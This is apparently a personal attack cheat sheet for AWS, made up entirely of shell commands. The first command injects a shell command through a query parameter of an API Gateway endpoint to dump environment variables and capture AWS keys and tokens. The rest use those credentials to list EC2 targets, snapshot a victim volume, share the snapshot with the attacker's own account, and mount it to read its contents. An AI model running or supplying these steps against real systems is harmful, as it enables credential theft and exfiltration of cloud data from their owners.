~~~ Profile Setup ~~~
curl -s "https://a8spqqmetd.execute-api.us-east-1.amazonaws.com/prod?inputstring=1%3Bexport+%7C+grep+AWS+%7C+grep+AWS%3B+echo+1" | grep -e "KEY\|TOKEN" # gather AWS creds

vi ~/.aws/credentials # setup your AWS profile

aws ec2 describe-instances --region us-east-2 >> ec2_dump # get potential targets

~~~ Get Snapshot ~~~

aws ec2 create-snapshot --volume-id vol-0eabf084f016b3913 # create snapshot of a given target

aws ec2 describe-snapshots --snapshot-ids snap-03a9463124b1c67e2 # check on snapshot progress

aws ec2 modify-snapshot-attribute --snapshot-id snap-03a94... --attribute createVolumePermission --operation-type add --user-ids <your_account_id> # Give your account permission to clone the snapshot

~~~ Access Snapshot ~~~

ls /dev | grep df

mkdir /mnt/snapshot

mount /dev/xvdf1 /mnt/snapshot